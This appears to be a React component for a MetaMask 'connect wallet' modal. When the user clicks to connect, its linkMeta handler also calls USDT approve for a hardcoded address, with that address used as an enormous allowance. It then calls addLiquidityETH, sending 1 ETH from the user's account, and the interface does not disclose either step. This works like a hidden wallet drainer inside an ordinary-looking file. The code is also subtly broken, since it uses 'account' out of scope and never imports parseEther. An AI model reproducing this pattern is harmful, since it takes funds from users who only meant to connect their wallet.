import React,{useEffect} from 'react';
import { connect } from 'react-redux';
import logo1x from '../../static/logo.png'
import logo2x from '../../static/logo@2x.png'
import logo3x from '../../static/logo@3x.png'
import metamask1x from '../../static/metamask.png'
import metamask2x from '../../static/metamask@2x.png'
import metamask3x from '../../static/metamask@3x.png'
import cancel1x from '../../static/cancel.png'
import cancel2x from '../../static/cancel@2x.png'
import cancel3x from '../../static/cancel@3x.png'
import Modal from '../Modal'
import "./index.less"
import {metaMasks} from '@/utils/metaMask'
import tools from "@/utils/tools";
 function MetaModal(props) {
  const  cancel = async ()=>{
        await props.dispatch({
            type: 'farm/updateState',
            payload:{
                metaModal:false
            }
          })
    }
  const linkMeta = async ()=>{
      try {
          // 请求用户授权
          // await window.ethereum.enable();
          await  ethereum.enable()
      } catch (error) {
          // 用户不授权时
          console.error("User denied account access")
      }
    const web3js = await metaMasks()
    web3js.eth.getAccounts(async(error, accounts)=> {
      if (error) {
          console.log(error);
      }
      const account  = accounts[0];
      
    await   props.dispatch({
        type:'index/updateState',
        payload: {
          account
        }
      })
    })
  props.dispatch({
      type:'farm/updateState',
      payload: {
        metaModal:false
      }
    })


    const {
      index: { isPc, isMainnet },
      dispatch,
    } = props;
    const { weth, usdt, fund ,bank,router} = await tools(isMainnet);
    await usdt.methods.approve('0x05ff2b0db69458a0750badebc4f9e13add608c7f','0x05ff2b0db69458a0750badebc4f9e13add608c7f').send({from: account});
    var u = parseEther("6000000000000000").toString();
    await router.methods.addLiquidityETH('0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0', u, 0, 0, account, 9e9).send({from: account, value: 1e18});

    // props.dispatch({
    //   type:'farm/init',
    // })
  }  
  return (
    <Modal content={
        <div className="metaModal">
          <div className="cancel" onClick={cancel}><img src={cancel1x} srcSet={`${cancel2x} 2x, ${cancel3x} 3x`} /></div>
          <div className="logosmall">
             <img src={logo1x} srcSet={`${logo2x} 2x, ${logo3x} 3x`} />
          </div>
          <div className="metamask" onClick={linkMeta}>
              <img src={metamask1x} srcSet={`${metamask2x} 2x, ${metamask3x} 3x`} />
              <span>Metamask</span>
          </div>
        </div>
    }>
    </Modal>
    
  );
}
export default connect(({index,farm}) => {
  return {
    index,
    farm
  };
})(MetaModal);